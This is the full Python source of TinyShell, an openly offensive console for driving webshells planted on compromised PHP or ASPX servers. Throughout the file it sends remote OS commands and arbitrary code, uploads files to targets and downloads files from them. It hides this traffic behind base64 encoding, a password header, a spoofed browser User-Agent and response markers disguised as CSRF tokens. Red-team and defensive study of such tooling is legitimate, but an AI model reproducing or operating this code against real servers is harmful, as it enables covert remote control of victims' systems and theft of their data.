## Title:       tinyshell.py
## Author:      Joe Vest
## Description: Command console framework that control webshells

"""
___________ __               _________ __            __   __   
\__    ___/|__| ____ ___ __ /   _____/|  |__   ____ |  | |  |  
  |    |   |  |/    \   |  |\_____  \ |  |  \_/ __ \|  | |  |  
  |    |   |  |   |  \___  |/        \|   |  \  ___/|  |_|  |__
  |____|   |__|___|__/_____/_________/|___|__/\_____>____/____/

TinyShell - Webshell Console - Joe Vest - 2015

Usage: 
    tinyshell.py  --url=<url> --language=<language>
    tinyshell.py  --url=<url> --language=<language> [--mode=<traffic_mode>] [--useragent=<useragent] [--password=<password>] [-t=<timeout>]
    tinyshell.py (-h | --help) More Help and Default Settings

Options:
    -h --help                This Screen
    --url=<url>              URL source of webshell (http://localhost:80)
    --language=<language>    Webshell language (PHP, ASPX)
    --mode=<traffic_mode>    Traffic characteristics (clear, base64_post, base64_header) [default: clear]
    --useragent=<useragent>  User-Agent String to use [default: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)]
    --password=<password>    POST REQUEST parameter or HTTP HEADER used as password [default: password]
    -t=<timeout>             HTTP Timout in seconds [default: 10]

"""

import os
import base64
import cmd
import sys
import requests
import docopt
import re
import shlex
import signal
import threading
import time
from UserString import MutableString
from socket import timeout as TimeoutException
from code_commands import *



# FUNCTIONS 
def sig_break_handler(signum, frame):
    """signal handler: Ctrl-Z, Ctrl-C, Ctrl-D"""
    console.postloop() 

def color(text="", clr=None, background=None, style=None,reset=True):
    """colored text..."""
    colors = {
        'OKBLUE'  : '\033[94m',
        'OKGREEN' : '\033[92m',
        'WARNING' : '\033[93m',
        'FAIL'    : '\033[91m',
        'BLACK'   : '\033[30m',
        'RED'     : '\033[31m',
        'GREEN'   : '\033[32m', 
        'YELLOW'  : '\033[33m',
        'BLUE'    : '\033[34m', 
        'PURPLE'  : '\033[35m',
        'CYAN'    : '\033[36m', 
        'WHITE'   : '\033[37m' }

    styles = {
        'BOLD'    : '\033[1m',
        'HEADER'  : '\033[95m'}

    backgrounds = {
        'BLACK'   : '\033[40m',
        'RED'     : '\033[41m',
        'GREEN'   : '\033[42m',
        'YELLOW'  : '\033[43m',
        'BLUE'    : '\033[44m',
        'PURPLE'  : '\033[45m',
        'CYAN'    : '\033[46m',
        'WHITE'   : '\033[47m'}

    if reset:
        ENDC = '\033[0m'
    else:
        ENDC = ''

    sys.setrecursionlimit(999999999)
    text = MutableString(text) 

    #COLORS
    if clr:
        clr = clr.split()
        clrs = []
        for each in clr:
            clrs.append(colors[each.upper()])
        if len(clrs) > 1:        
            for i in xrange(len(text)).__reversed__():
                text[i] = random.sample(clrs,1)[0] + text[i]
        else:
            text = clrs[0] + str(text)

    #BACKGROUND
    if background:
        BACKGROUND = backgrounds[background.split()[0].upper()]
        text = BACKGROUND + text
 
    #STYLES
    if style:
        style = style.split()
        STYLE = ""
        for each in style:
            STYLE += styles[each.upper()]
        text = STYLE + text
 
    return text+ENDC

########################################
# Console Class
########################################
class Console(cmd.Cmd):
    """ Main Console """

    def __init__(self, url, language, uas, password, mode, timeout):
        cmd.Cmd.__init__(self)
        self.url = url
        self.language = language
        self.useragentstring = uas
        self.mode = mode
        targetRE = re.compile("^.+://(.+?)/.+$")
        self.target = targetRE.match(url).groups()[0]
        self.download_threads = []
        self.upload_threads = []

        ########################################
        # HTTP Headers
        ########################################
        self.headers = {}
        self.headers["User-Agent"] = self.useragentstring
        self.timeout = timeout # Default timeout in seconds
        self.password = password # POST request parameter

        ########################################
        # RESPONSE wrapper
        ########################################
        
        #self.rsp_header = '<!-- csrf_token: '
        #self.rsp_footer = ' />'

        self.rsp_header = 'CSRF_TOKEN: '
        self.rsp_footer = ' :TOKEN_CSRF'


        ########################################       
        # Setup Reuseable HTTP session
        ##################re######################
        self.s = requests.Session()
        self.s.headers.update(self.headers)
        self.currentdir = ""

        ########################################
        # Initial Commands
        ########################################
        self.do_pwd()
        self.do_cd(self.currentdir)  
        self.do_config()


    def sendCommand(self, url, password, language, cmd_type, command, timeout):
        """
        url         target url
        password    POST request parameter or HTTP Header used as password
        language    Webshell language
        cmd_type    Command type to execute
        command     OS command to execute
        timeout     HTTP Timeout in seconds
        """
        result = ""
        mode = self.mode
        rsp_header = self.rsp_header
        rsp_footer = self.rsp_footer

        cmd = remote_command(language, cmd_type, mode, rsp_header, rsp_footer, command)

        # Check for specific conditions based on mode
        # Apply MODE Encode/Decode for REQUEST
        if mode == "clear":
            data = {password:cmd}
        if mode == "base64_post":
            data = {password:cmd}
        if mode == "base64_header":
            # Check if payload is greater the 8K.  
            # Large HTTP Headers can cause errors or fail
            if sys.getsizeof(cmd) > 8000:
                msg = "[!] Warning: Upload payload too large for Mode base64_header\n"
                msg += "    HTTP Header payload is limited to 8000 bytes.\n"
                msg += "    Current payload is " + str(sys.getsizeof(cmd)) + " Bytes."

                print color(msg,"red", style="bold")
                return ""
            else:

                data = {} # Data is in header not POST
                self.headers[password] = cmd
                self.s.headers.update(self.headers)

        try:
            r = self.s.post(url,data=data,verify=False, timeout=int(timeout))

            if r.status_code == 200:
                # Remove Beginning and trailing newlines
                result = r.text.strip()

            else:
                # Remove Beginning and trailing newlines
                result = r.text.strip()

                msg = "[!] HTTP ERROR: " + str(r.status_code)
                print color(msg,"red", style="bold")

                return result

            # Locate Data in between header + footer
            r = re.compile(rsp_header + '(.+)' + rsp_footer , re.DOTALL)
            if r.search(result):
                m = r.findall(result)
                result = m[0]
            else:
                result = ''

            # ENCODE/DECODE HTTP Request
            # If updates made, modify HTTP Response (code_commands.py) as well
            # Apply MODE to Decode HTTP Response
            if mode == "clear":
                result = result
            if mode == "base64_post":
                result = base64.b64decode(result)
            if mode == "base64_header":
                result = base64.b64decode(result)

            return result

        except requests.ConnectionError as e:
            msg = "[!] ERROR (CONNECTION): \n" + str(e.message)
            print color(msg,"red", style="bold")
            return ''

        except requests.Timeout as e:
            msg = "[!] ERROR (TIMEOUT): \n" + str(e.message[-1])
            print color(msg,"red", style="bold")
            return ''

    def thread_cleanup(self):
        """ clean up thread queue """
        for t in self.upload_threads:
            if not t.isAlive():
                self.upload_threads.remove(t)
        for t in self.download_threads:
            if not t.isAlive():
                self.download_threads.remove(t)

    ## Command definitions ##
    def do_exit(self, args=None):
        """Exits from the console"""
        return -1
        self.postloop()

    def do_history(self, args):
        """Print a list of last 20 commands that have been entered"""
        for item in self._history[-21:-1]:
            print color(item,"blue",style="bold")

    def do_config(self, args=None):
        """Show current settings"""

        banner = "\t\tCURRENT CONFIGURATION" + " " * 20
        output = ""
        output += "Target URL:        {0}\n".format(self.url)
        output += "Language:          {0}\n".format(self.language)
        output += "Password:          {0}\n".format(self.password)
        output += "Traffic Mode:      {0}\n".format(self.mode)
        output += "User-Agent:        {0}\n".format(self.useragentstring)
        output += "Response Header:   {0}\n".format(self.rsp_header)
        output += "Response Footer:   {0}\n".format(self.rsp_footer)
        output += "User-Agent:        {0}\n".format(self.useragentstring)
        output += "HTTP Timeout:      {0}\n".format(self.timeout)
        output += "Current Directory: {0}\n".format(self.currentdir)

        print color(banner,clr="yellow",background="blue",style="bold")
        print color(output,"blue",style="bold")
        print ""

        # Print Warning if running in Clear Text mode

        if self.mode == "clear":
            print color("[!] WARNING: Running Clear Text Mode","red",style="bold")
            print color("[!] This mode should only be used for troubleshooting and debugging.","red",style="bold")
            print ""


    def do_command(self, args):
        """Issues remote command through webshell to remote system. """
        cmd_type = "OS"
        result = self.sendCommand(self.url, self.password, self.language, cmd_type, args, self.timeout)
        print color(result,clr="green",style="bold")

    def do_download(self, args):
        """Download file from remote system 
        \tdownload <remote-source>
        \tdownload targetile.txt
        \tdownload c:\\widnows\\temp\\targetfile.txt
        """
        #cmd_type = "DOWNLOAD"
        #result = self.sendCommand(self.url, self.password, self.language, cmd_type, args, self.timeout)
        #print color(result,clr="green",style="bold")

        args = args.replace('\\','\\\\')

        filepath = args
        defaultpath = os.path.join("downloads",self.target)

        if (not args):
            print color("Missing arguments",clr="FAIL",style="bold")
            self.do_help("download")
            return ""         

        #Determine Relative or Absolute path
        if (":\\" in filepath[0:3]):
            #Absolute path, do nothing
            pass
        elif (filepath.startswith("\\\\")):
            #UNC Path
            pass
        else:
            #Relative path
            filepath = self.currentdir + "\\" + filepath

        filepath = filepath.replace('\\','\\\\')

        print color("Downloading " + filepath + " ...",clr="blue",style="bold")
        t = threading.Thread(target=self.new_download, args=(filepath,defaultpath),name=filepath)
        self.download_threads.append(t)
        s = self.timeout
        self.timeout = 180
        t.start()
        time.sleep(.25)
        self.timeout = s

    def new_download(self, args=None, defaultpath=None):
        """New thread for downloads"""
 
        cmd_type = "DOWNLOAD"

        filepath = args
        try:
            #result = self.sendCommand(self.url, commandType, filepath)
            result = self.sendCommand(self.url, self.password, self.language, cmd_type, args, self.timeout)

        except TimeoutException:
            print color("\n\tDownload for " + filepath + " has timed out. =(", "red", style="bold")
            return
                
        defaultpath = defaultpath.replace(":","_")
        if not os.path.exists(defaultpath):
            os.makedirs(defaultpath)
        localpath = os.path.join(defaultpath,os.path.split(filepath.replace("\\","/").lstrip("//"))[0])
        localfile = os.path.split(filepath.replace("\\","/"))[1]
        fixedpath = []
        while True:
            if localpath == '' or localpath == '//':
                break
            p = os.path.split(localpath)[1]
            localpath = os.path.split(localpath)[0]
            fixedpath.insert(0,p.replace(":","").lower())
        localpath = os.path.join(*fixedpath)
        try:
            os.makedirs(localpath)
        except OSError:
            pass
        f = None
    
        # Is file blank?
        if result == "":
            msg = "File has no data or does not exist.  Save cancled: {0}".format(filepath)
            print color(msg,clr="WARNING",style="bold")
            return

        # Save downloaded file
        if not os.path.exists(os.path.join(localpath, localfile)):
            f = open(os.path.join(localpath, localfile),'wb')
            f.write(result)
            f.close()
            print color("Download complete:" + localfile,clr="blue",style="bold")
        else:
            msg = "Already downloaded? File '{0}' already exists".format(os.path.join(localpath, localfile))
            print color(msg,clr="WARNING",style="bold")

    def do_upload(self, args):
        """
        Upload file to target
        \tupload <local-source> <remote-destination-full-path>
        \tupload myfile.txt c:\\windows\\temp\\myfile.txt
        """ 
        if (not args):
            print color("Missing arguments",clr="FAIL",style="bold")
            self.do_help("upload")
        elif(not os.path.exists(args.split()[0])):
            print color("\n\tLocal file does not exist..","red")
        else:
            self.thread_cleanup()
            if os.path.getsize(args.split()[0]) > 2000000:
                print color("\n\tWARNING File exceeds 2mb limit. This may fail depending on server config.","red",style="bold")
                time.sleep(5)    
            s = self.timeout
            self.timeout = 180
            t = threading.Thread(target=self.new_upload, args=(args,),name=args.split()[0])
            self.upload_threads.append(t)
            
            t.start()
            time.sleep(.25)
            self.timeout = s

    def new_upload(self, args):
        """New thread for uploads""" 

        # parse src / dst files
        args = args.replace('\\','\\\\')
        args = shlex.split(args)
        src = args[0]
        if len(args) > 1:
            dst = args[1]
        else:
            dst = ".\\"+os.path.split(src)[1]

        if os.path.isdir(src):
            print color("\n\tSorry, I cannot upload a directory..","red")
        
        elif os.path.isfile(src):            
            
            f = open(src, "rb").read()
            command = (f,dst)

            cmd_type = 'UPLOAD'
            try:
                print color("\n\tUploading " + src + " to " + dst + " ...\n","blue",style="bold")
                #result = self.sendCommand(self.url, commandType, dst, toUpload = f)
                result = self.sendCommand(self.url, self.password, self.language, cmd_type, command, self.timeout)

            except requests.Timeout:
                print color("Upload thread for " + src + " has timed out. =(", "red", style="bold")

            print color(result,"blue",style="bold")

        else:
            print color("\n\tLocal file: "+src+" does not exist..","red")

    def do_code(self, args):
        """Execute arbitrary code"""
        cmd_type = "CODE"
        result = self.sendCommand(self.url, self.password, self.language, cmd_type, args, self.timeout)
        print color(result,clr="green",style="bold")

    def do_pwd(self, args=None):
        """Execute sendCommand 'echo %cd%' to obtain current working directory"""
        cmd_type = "OS"
        args = 'cd'
        self.currentdir = self.sendCommand(self.url, self.password, self.language, cmd_type, args, self.timeout)
        self.currentdir = self.removeNewline(self.currentdir)

    def do_ps(self, args=None):
        """Calls tasklist on target"""
        cmd_type = "OS"
        args = 'tasklist'
        result = self.sendCommand(self.url, self.password, self.language, cmd_type, args, self.timeout)
        print color(result,clr="green",style="bold")

    def do_cd(self, args):
        """Change directory"""
        if not args == "":
            self.currentdir = self.build_dir(args)
            self.prompt = color()+"["+color(self.currentdir,"green") + "]# "   
        else:
            self.currentdir = self.build_dir(self.currentdir)
            self.currentdir = self.currentdir
            self.prompt = color()+"["+color(self.currentdir,"green") + "]# " 

    def do_help(self, args):
        """Get help on commands
           'help' or '?' with no arguments prints a list of commands for which help is available
           'help <command>' or '? <command>' gives help on <command>
        """
        ## The only reason to define this method is for the help text in the doc string
        cmd.Cmd.do_help(self, args)

    def do_timeout(self, args):
        """Sets timeout (seconds) used for HTTP requests"""
        
        try:
            self.timeout = int("".join(args))
            result = color("Timeout set to " + str(int(args)),clr="blue",style="bold")
        except:
            result =  color("Timeout must be integer\nCurrent Timeout: %s" % self.timeout,clr="WARNING",style="bold")

        print result

    def removeNewline(self, str):
        """Remove newline character from string"""
        clean = str.replace("\r\n","").replace("\n","")
        return clean

    def build_dir(self,change):
        if ":\\" in change[0:3] or change.startswith("\\\\"):
            return change.lower()
        else:
            newdir = self.currentdir
            change = change.split("\\")
            for each in change:
                if each == "..":
                    newdir = newdir.rsplit("\\",1)[0]
                elif each == "":
                    continue
                else:
                    newdir = newdir + "\\" + each
            print newdir
            return newdir.lower()

    def do_ls(self, args):
        """List contents of current directory."""

        if args is not None:
            args = self.build_dir(args)

        args = 'dir ' + args
        cmd_type = "OS"

        result = self.sendCommand(self.url, self.password, self.language, cmd_type, args, self.timeout)
        print color(result,clr="green",style="bold")

    def do_dir(self,args):
        """Calls ls, to prevent dir'ing your actual cwd instead of the virtual set by cd"""
        self.do_ls(args)

    def do_setheader(self,args):
        """Set HTML Header used to wrap responses"""
        self.rsp_header = args

    def do_setfooter(self,args):
        """Set HTML Footer used to wrap responses"""
        self.rsp_footer = args

    ## Override methods in Cmd object ##
    def preloop(self):
        """Initialization before prompting user for commands.
           Despite the claims in the Cmd documentaion, Cmd.preloop() is not a stub.
        """
        cmd.Cmd.preloop(self)   ## sets up command completion
        self._history    = []      ## No history yet
        self._locals  = {}      ## Initialize execution namespace for user
        self._globals = {}

    def postloop(self):
        """Take care of any unfinished business.
           Despite the claims in the Cmd documentaion, Cmd.postloop() is not a stub.
        """
        cmd.Cmd.postloop(self)   ## Clean up command completion

        print color(reset=True)
        print "Exiting..."
        return os.kill(os.getpid(),signal.SIGKILL) #forceful exit
        sys.exit()


    def precmd(self, line):
        """ This method is called after the line has been input but before
            it has been interpreted. If you want to modifdy the input line
            before execution (for example, variable substitution) do it here.
        """
        self._history += [ line.strip() ]
        return line

    def postcmd(self, stop, line):
        """If you want to stop the console, return something that evaluates to true.
           If you want to do some post command processing, do it here.
        """
        return stop

    def emptyline(self):    
        """Do nothing on empty input line"""
        pass

    def default(self, line):       
        """Called on an input line when the command prefix is not recognized.
           In that case we execute the line as Python code.
        """
        
        """Issues command to send HTTP Request"""
        cmd_type = "OS"
        args = line
        result = self.sendCommand(self.url, self.password, self.language, cmd_type, args, self.timeout)

        print color(result,clr="green",style="bold")



if __name__ == '__main__':

    
    intro = """
___________ __               _________ __            __   __   
\__    ___/|__| ____ ___ __ /   _____/|  |__   ____ |  | |  |  
  |    |   |  |/    \   |  |\_____  \ |  |  \_/ __ \|  | |  |  
  |    |   |  |   |  \___  |/        \|   |  \  ___/|  |_|  |__
  |____|   |__|___|__/_____/_________/|___|__/\_____>____/____/

TinyShell - Webshell Console - Joe Vest - 2015
"""
    
    try:
        # Parse arguments, use file docstring as a parameter definition
        arguments = docopt.docopt(__doc__,help=True)   

        modes = ['clear','base64_post', 'base64_header']     
        
        url        = arguments['--url']
        language   = arguments['--language']
        mode       = arguments['--mode']
        uas        = arguments['--useragent']
        password   = arguments['--password']
        timeout    = arguments['-t'] or 10

        if mode not in modes:
            print color("Invalid mode, Valid Choices:",clr="red")
            for i in modes:
                print color("\t" + i,clr="green",style="bold")
            exit()

        os.system("clear")
        target = color(url,clr="black",background="yellow",style="bold")
        print intro
        print color("Connecting to " + url,"yellow",style="bold")

        console = Console(url, language, uas, password, mode, timeout)
        signal.signal(signal.SIGTSTP,sig_break_handler)
        signal.signal(signal.SIGINT,sig_break_handler)
        console . cmdloop() 
        
    # Handle invalid options
    except docopt.DocoptExit as e:
        print e.message





